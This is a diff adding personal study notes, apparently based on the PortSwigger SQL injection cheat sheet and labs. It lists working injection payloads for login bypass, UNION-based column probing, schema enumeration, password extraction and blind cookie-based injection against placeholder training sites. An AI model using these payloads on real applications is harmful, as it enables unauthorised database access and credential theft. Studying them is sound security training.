@@ -1,0 +1,91 @@
+SQL injection cheat sheet
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+'
+The single quote character ' and look for errors or other anomalies
+
+Different
+Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses
+
+'--
+https://insecure-website.com/products?category=Gifts'--
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+'+OR+1=1--
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+administrator'--
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+UNION attacks:
+UNION keyword to retrieve data from other tables within the database
+
+Two key requirements must be met:
+The individual queries must return the same number of columns
+The data types in each column must be compatible between the individual queries
+
+Determining the number of columns required:
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+Until
+The ORDER BY position number 3 is out of range of the number of items in the select list
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+If the number of nulls does not match the number of columns, the database returns an error
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists
+
+Oracle:
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table
+There is a built-in table on Oracle called dual
+' UNION SELECT NULL FROM DUAL--
+
+Finding columns with a useful data type:
+probe each column to test whether it can hold string data:
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+If the column data type is not compatible with string data, the injected query will cause a database error
+Conversion failed when converting the varchar value 'a' to data type int
+
+' UNION SELECT username, password FROM users--
+
+Retrieving multiple values within a single column
+on Oracle:
+' UNION SELECT username || '~' || password FROM users--
+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+Examining the database:
+Microsoft, MySQL --> SELECT @@version
+Oracle --> SELECT * FROM v$version
+PostgreSQL --> SELECT version()
+
+%27%20UNION%20SELECT%20@@version,%20%27def%27%23 --> %23="#" --> Comment
+
+Listing the contents of the database:
+Most database types (except Oracle) have a set of views called the information schema
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+Blind SQL:
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+The SUBSTRING function is called SUBSTR on some types of database
+
+TrackingId=xyz' AND '1'='1
+TrackingId=xyz' AND '1'='2
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+
